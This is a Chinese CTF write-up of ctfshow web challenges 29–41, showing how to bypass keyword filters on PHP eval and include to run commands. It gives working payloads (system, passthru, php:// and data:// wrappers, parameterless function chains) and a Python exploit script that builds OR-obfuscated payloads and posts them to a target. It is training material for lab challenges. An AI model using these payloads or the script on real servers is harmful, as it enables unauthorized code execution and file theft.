---
title: ctfshow刷题_web入门命令执行篇
description: 'PART1_29-41'
abbrlink: e40cde58
date: 2022-09-24 15:47:17
cover: false
tags:
  - CTF-Web
categories:
  - CTF
  - Web安全
  - 刷题
typora-root-url: ..
---





# Web29

```php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

使用GET传参数`c`, 如果使用`preg_match`在`c`中没有匹配到`flag`字符串, 那么`c`就能被执行

先传一个`phpinfo()`, 可以正常执行

<img src="/images/ctf-web06/image-20220924155413736.png" alt="image-20220924155413736" style="zoom:67%;" />

**`php`中, 可以使用`system("要执行的系统命令")`来执行系统命令**

例如这里传一个:

```php
system("ls")
```

成功读取了当前目录下的内容, 发现有个`flag.php`

<img src="/images/ctf-web06/image-20220924155523457.png" alt="image-20220924155523457" style="zoom:67%;" />

但flag会被过滤掉，遂尝试使用通配符*来绕过：

```php
system("cat f*.php")
```

<img src="/images/ctf-web06/image-20220924155651400.png" alt="image-20220924155651400" style="zoom:67%;" />

然而什么都没显示.. 那么尝试将结果输出到文件中:

```
system("cat f*.php>>3.txt")
```

执行后再访问`3.txt`, 就能够看到flag了

<img src="/images/ctf-web06/image-20220924155815662.png" alt="image-20220924155815662" style="zoom:67%;" />

<br>

***

<br>



# Web30



```php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

这次把`system命令也过滤了`

**在GET中用 `eval`执行POST中的变量, 然后在POST中执行命令**

<img src="/images/ctf-web06/image-20220924161454556.png" alt="image-20220924161454556" style="zoom:67%;" />

查看1.txt就找到flag了

![image-20220924161522232](/images/ctf-web06/image-20220924161522232.png)



<br>

***

<br>

# Web31

```php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

和30类似, 只不过多过滤了不少关键词, 30的方法已经可以使用

这里尝试一下使用`passthru`命令来执行系统命令

<img src="/images/ctf-web06/image-20220924162452963.png" alt="image-20220924162452963" style="zoom:67%;" />

<br>

***

<br>

# Web32

```php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

这次连分号和括号都过滤了

```
?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
```

<img src="/images/ctf-web06/image-20220924162859817.png" alt="image-20220924162859817" style="zoom:67%;" />

首先因为c的内容会在后边的代码中被执行, 那么使用`include` 将变量`GET[a]`包含进去,这里后边本应有个分号,但分号被过滤了,所以使用` ?> `相当于**提前对php代码进行闭合**

**`&`在url中的作用是分割不同的GET变量**

上面的代码只会对变量c的值进行过滤,而不会检查这里包含进去的变量a的值, 所以在a中使用`php伪协议`来将`flag.php`的代码用`base64`编码的形式输出, 再将其解码就能看到flag了

<br>

***

<br>

# Web33-36

接下来四道题都是在32的基础上继续增加过滤的关键词,但都能够使用32题的方法解决~

```
?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
```



<br>

***

<br>

# Web37

<img src="/images/ctf-web06/image-20220924163101782.png" alt="image-20220924163101782" style="zoom:67%;" />

这次没有 `eval`了, 因此c的内容不能再被当作代码执行了

而c被`include`函数包含了，因此考虑通过c来执行`php伪协议`命令

使用`data://`协议可以执行php代码

- `data://text/plain,<?php 被执行的代码;`

- `data://text/plain;base64, 被执行代码的base64编码`（包含<?php和?>）

<img src="/images/ctf-web06/image-20220924163532005.png" alt="image-20220924163532005" style="zoom:67%;" />



<br>

***

<br>

# Web38

<img src="/images/ctf-web06/image-20220924163606046.png" alt="image-20220924163606046" style="zoom:67%;" />

过滤了关键词php, 因此在上一题的基础上, 使用base64对要执行的php代码进行编码就可以绕过过滤了

<img src="/images/ctf-web06/image-20220924163707058.png" alt="image-20220924163707058" style="zoom:67%;" />

上图中的编码解码后为:

```php
<?php system("ls"); ?>
```

执行完这一句,在执行编码后的这一句即可

```php
<?php system("cat f*.php>>1.txt")?>
```

<br>

***

<br>

# Web39

<img src="/images/ctf-web06/image-20220924164006560.png" alt="image-20220924164006560" style="zoom:67%;" />

在37题的基础上, `include`中, 变量c后面加了`.php`后缀

那么这里可以在`data://`伪协议中要执行的`php`代码后面加上`?>`闭合它, 由此,payload为:

```
c=data:text/plain,<?php system('cat f*')?>
```

这里就相当于执行了`<?php system('cat f*')?>.php` 因为语句已经提前闭合了, 所以后面的`.php`后缀并没有什么用

<br>

***

<br>

# Web40

![image-20220924170359956](/images/ctf-web06/image-20220924170359956.png)

过滤了很多符号, php伪协议应该是用不了了

上边过滤的是中文括号，所以英文括号应该是可以用的

>这里使用无参数的`RCE(remote command/code execute)`
>
>也就是可以执行`a()、a(b())或a(b(c()))`，但不能是`a('b')`或`a('b','c')`，不能带参数,因为引号被过滤了

https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE

那么本题需要使用无参数, 且能够返回一定的字符的函数来构造最终的payload

- `Localeconv()`返回一包含本地数字及货币格式信息的**数组**，其中第一个元素是` .`

- `current()`返回数组中的单元，默认是第一个，`pos()`与`current()`作用相同

  那么, `current(localeconv())`返回的就是`.`

- `scandir()`扫描一个目录,将目录里的文件以数组的形式返回

  那么` scandir(current(localeconv()))`就相当于 `scandir(.)`作用为扫描当前目录

- `print_r`打印

​		`Print_r(scandir(current(localeconv())))`作用就是打印当前目录下的内容

-  `getcwd()`获取当前的绝对路径

  那么`Print_r(scandir(getcwd()))`就是扫描当前目录并输出结果

- ` show_source()`显示源码

- 数组操作:

  -  `each()`返回当前键、值，并将指针向后移动一步
  - `end()`指针指向最后一个单元
  - `next()`指针后移一步
  - `prev()`指针前移一步
  - `array_reverse()`用相反的元素顺序返回数组

先查看当前目录下都有哪些文件:

<img src="/images/ctf-web06/image-20220924171411445.png" alt="image-20220924171411445" style="zoom:67%;" />

逆序输出文件名数组:

<img src="/images/ctf-web06/image-20220924171750132.png" alt="image-20220924171750132" style="zoom:67%;" />

将数组指针指向下一个元素, 也就是`flag.php`使用 `showsource()`输出它的源码

![image-20220924171800583](/images/ctf-web06/image-20220924171800583.png)

<br>

***

<br>

# Web41

![image-20220924172602630](/images/ctf-web06/image-20220924172602630.png)

这题连字母都过滤了

通过脚本来完成, 首先通过一个php脚本生成

```php
<?php
$my_file = fopen("rce_or.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) { 
	for ($j=0; $j <256 ; $j++) { 

		if($i<16){
			$hex_i='0'.dechex($i);
		}
		else{
			$hex_i=dechex($i);
		}
		if($j<16){
			$hex_j='0'.dechex($j);
		}
		else{
			$hex_j=dechex($j);
		}
		$preg = '/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i';  # 把题目里的过滤条件放在这里
		if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
					echo ""; # 检查上面生成的十六进制数在转二进制后(hex2bin)能否被题目中给的过滤条件匹配到
    } 
  
		else{
		$a='%'.$hex_i; # 如果没有被匹配到, 则在它们前面加上%,处理成url编码的格式
		$b='%'.$hex_j;
		$c=(urldecode($a)|urldecode($b)); 
            # a和b url解码后在二进制下进行或运算,得到的结果是c这个字符
		if (ord($c)>=32&ord($c)<=126) {
			$contents=$contents.$c." ".$a." ".$b."\n";
		}
	}
}
}
fwrite($my_file,$contents);
fclose($my_file);
?>
```

上述代码生成一个这样的文件:  后面两个url编码后的字符(这些字符不会被题目中的过滤条件过滤)在经过或运算之后能够得到前面的字符,

那么接下来就可以通过两个字符进行或运算的方式来构造最终希望执行的命令代码

<img src="/images/ctf-web06/image-20220925203512064.png" alt="image-20220925203512064" style="zoom:67%;" />

构造命令并发送通过python脚本来完成

```python
# -*- coding: utf-8 -*-
import requests
import urllib
from sys import *
import os
# os.system("php rce_or.php")  # 没有将php写入环境变量需手动运行
if (len(argv) != 2):
    print("=" * 50)
    print('USER：python exp.py <url>')
    print("eg：  python exp.py http://ctf.show/")
    print("=" * 50)
    exit(0)
url = argv[1]
def action(arg):
    s1 = ""
    s2 = ""
    for i in arg: # 这里的arg就是我们需要执行的命令,及这个命令的参数, 例如show_source(flag.php)
        f = open("rce_or.txt", "r")
        while True:
            t = f.readline()
            if t == "":
                break
            if t[0] == i: # 对于arg中的每个字符, 取出能够通过运算得到它的两个编码
                # print(i)
                s1 += t[2:5]
                s2 += t[6:9]
                break
        f.close()
    output = "(\"" + s1 + "\"|\"" + s2 + "\")" 
    # 得到的结果是第一个编码组成的串和第二个编码组成的串的或运算结果, 注意中间那个"|"是进行或运算的意思
    return (output)
while True:
    param = action(input("\n[+] your function：")) + action(input("[+] your command："))
    data = {
        'c': urllib.parse.unquote(param) # 解码
    }
    print(param+"\n")
    print(data)
    r = requests.post(url, data=data)
    print("\n[*] result:\n" + r.text)

```

程序运行结果如下图, 可以看到flag已经在响应包里了

```
D:\python learning\ctf>py web41.py http://080c3454-e571-44f6-80db-b2aac9c9e04e.challenge.ctf.show/

[+] your function：show_source
[+] your command：flag.php

下面这两行是 param的内容, 对应位置的字符进行或运算可以分别得到 show_source 和 flag.php
("%13%08%0f%17%00%13%0f%15%12%03%05"|"%60%60%60%60%5f%60%60%60%60%60%60")  ("%06%0c%01%07%00%10%08%10"|"%60%60%60%60%2e%60%60%60")
下面是最后准备POST的参数c的内容
{'c': '("\x13\x08\x0f\x17\x00\x13\x0f\x15\x12\x03\x05"|"````_``````")("\x06\x0c\x01\x07\x00\x10\x08\x10"|"````.```")'}

[*] result:
<code><span style="color: #000000">
<br /></span><span style="color: #0000BB">$flag</span><span style="color: #007700">=</span><span style="color: #DD0000"><br /></span>8161-85c6-4f0d-86b7-d83330fadd27}"</span><span style="color: #007700">;
</span>
</code>1
```



在上述python脚本中,` param`中字符原本为url编码的格式,也就是`%xx`格式, 它们解码后的字符都不在题目的过滤范围之内

35行需要对这些字符进行解码是因为它们在发送时还会被url编码, 这里的解码和后面发送时的自动编码是成对的. 抓包也能证明这一点

<img src="/images/ctf-web06/image-20220925210440486.png" alt="image-20220925210440486" style="zoom:67%;" />



所以当这个包到达目标服务器时,按照正常流程还应该进行url解码, 所以题目给的脚本检测的实际上正是`param`的形式,因此也就绕过了过滤. 









